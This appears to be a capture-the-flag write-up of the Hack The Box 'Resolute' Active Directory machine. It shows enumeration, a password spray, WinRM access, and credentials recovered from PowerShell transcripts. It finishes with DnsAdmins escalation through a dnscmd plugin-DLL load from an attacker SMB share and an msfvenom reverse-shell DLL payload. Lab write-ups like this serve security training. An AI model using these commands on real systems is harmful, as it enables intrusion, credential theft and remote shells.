#Windows #active-directory 


# nmap scan

```shell
nmap -sC -sV -oN nmap/resolute $IP -T5 -p- 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-07 09:46 CDT
Warning: 10.129.96.155 giving up on port because retransmission cap hit (2).
Stats: 0:06:21 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 78.64% done; ETC: 09:54 (0:01:43 remaining)
Stats: 0:08:28 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 64.00% done; ETC: 09:55 (0:00:10 remaining)
Stats: 0:08:30 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 64.00% done; ETC: 09:55 (0:00:11 remaining)
Stats: 0:09:10 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 97.34% done; ETC: 09:55 (0:00:00 remaining)
Nmap scan report for 10.129.96.155
Host is up (0.24s latency).
Not shown: 65234 closed tcp ports (reset), 276 filtered tcp ports (no-response)
PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-10-07 15:01:52Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49670/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49686/tcp open  msrpc        Microsoft Windows RPC
49806/tcp open  msrpc        Microsoft Windows RPC
49854/tcp open  tcpwrapped
49911/tcp open  tcpwrapped
Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-10-07T15:02:47
|_  start_date: 2024-10-07T14:46:55
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Resolute
|   NetBIOS computer name: RESOLUTE\x00
|   Domain name: megabank.local
|   Forest name: megabank.local
|   FQDN: Resolute.megabank.local
|_  System time: 2024-10-07T08:02:48-07:00
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
|_clock-skew: mean: 2h27m01s, deviation: 4h02m32s, median: 6m59s

```


# enumerated smb share using rpcclient

```shell
rpcclient -U '' -N $IP

rpcclient -U '' -N $IP
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[ryan] rid:[0x451]
user:[marko] rid:[0x457]
user:[sunita] rid:[0x19c9]
user:[abigail] rid:[0x19ca]
user:[marcus] rid:[0x19cb]
user:[sally] rid:[0x19cc]
user:[fred] rid:[0x19cd]
user:[angela] rid:[0x19ce]
user:[felicia] rid:[0x19cf]
user:[gustavo] rid:[0x19d0]
user:[ulf] rid:[0x19d1]
user:[stevie] rid:[0x19d2]
user:[claire] rid:[0x19d3]
user:[paulo] rid:[0x19d4]
user:[steve] rid:[0x19d5]
user:[annette] rid:[0x19d6]
user:[annika] rid:[0x19d7]
user:[per] rid:[0x19d8]
user:[claude] rid:[0x19d9]
user:[melanie] rid:[0x2775]
user:[zach] rid:[0x2776]
user:[simon] rid:[0x2777]
user:[naoki] rid:[0x2778]

```

# crackmapexe also provides users

```shell
cme smb $IP -u '' -p '' --users
```

Found credentials from the description

marko:Welcome123!

# unable to login marko user, seems like the user changed his password so I used password spray attack using the Welcome123!

```shell
 cme smb 10.129.96.155 -u ldap.txt -p Welcome123!
```

# found melanie, gained remote access using the user
```shell
 evil-winrm -i 10.129.96.155 -u melanie -p Welcome123!
```

# /PStranscripts directory contains a file that has credentials

```powershell
ryan Serv3r4Admin4cc123!
```

```powershell
whoami /group
```

# ryan is a member of the group dnsadmins , this group has a privilege to modify dns server
[source](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges) 

```powershell
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll

sc.exe stop dns
sc.exe start dns
```
# Created an smb server for the dnscmd to pull files from 

```shell
sudo impacket-smbserver share $(pwd)

```

# msfvenom payload 

```shell
msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=<attacker> LPORT=<port> -f dll > shell.dll
```